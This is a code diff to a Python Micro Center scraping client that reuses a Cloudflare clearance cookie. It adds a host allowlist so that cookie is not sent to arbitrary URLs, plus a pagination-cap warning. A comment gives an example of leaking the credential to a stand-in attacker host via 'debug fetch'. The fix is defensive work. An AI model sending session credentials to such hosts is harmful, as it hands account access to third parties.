@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import sys
 import time
+from urllib.parse import urlparse
 
 from curl_cffi import requests as curl_requests
 from curl_cffi.requests.exceptions import ConnectionError as CurlConnectionError
@@ -26,6 +27,11 @@ _RETRYABLE_EXCEPTIONS = (CurlConnectionError, DNSError, SSLError, CurlError)
 # metadata claims -- if total_items parsing is ever wrong, this stops it from
 # looping until Cloudflare notices instead of stopping cleanly.
 MAX_AUTO_PAGES = 50
+
+# `mcenter debug fetch <url>` accepts an arbitrary URL, but every request attaches
+# the live session cookie -- without this check, `debug fetch https://evil.example/`
+# would hand cf_clearance (a bearer credential for the session) to a third party.
+_ALLOWED_HOST_SUFFIX = "microcenter.com"
 
 
 class MicroCenterError(RuntimeError):
@@ -80,6 +86,14 @@ class MicroCenterClient:
             print(f"[mcenter] {message}", file=sys.stderr)
 
     def _request(self, url: str, store_id: str):
+        host = urlparse(url).hostname or ""
+        if not (host == _ALLOWED_HOST_SUFFIX or host.endswith(f".{_ALLOWED_HOST_SUFFIX}")):
+            raise MicroCenterError(
+                f"refusing to send the session cookie to '{host}' -- only "
+                f"*.{_ALLOWED_HOST_SUFFIX} URLs are allowed (cf_clearance is a bearer "
+                "credential for the session, not something to leak to arbitrary hosts)."
+            )
+
         cookies = {**self._session.cookies, "storeSelected": store_id}
         headers = {
             "User-Agent": self._session.user_agent or "Mozilla/5.0",
@@ -165,11 +179,22 @@ class MicroCenterClient:
         that exists to protect."""
         page = 1
         while page <= max_pages:
-            result_page = self.search_page(query, store_id, page=page, category_n=category_n, rpp=rpp)
+            result_page = self.search_page(
+                query, store_id, page=page, category_n=category_n, rpp=rpp
+            )
             yield from result_page.results
             if not result_page.has_next:
                 return
             page += 1
+
+        # Loop exited via the max_pages cap, not because the site ran out of
+        # pages -- the caller got a truncated result set and needs to know, not
+        # silently believe they have everything.
+        print(
+            f"[mcenter] warning: stopped at the {max_pages}-page safety cap; "
+            "more results existed. Pass a higher max_pages if you really need them all.",
+            file=sys.stderr,
+        )
 
     def product(self, product_id: str, store_id: str) -> ProductDetail:
         resp = self._request(urls.product_url(product_id), store_id)
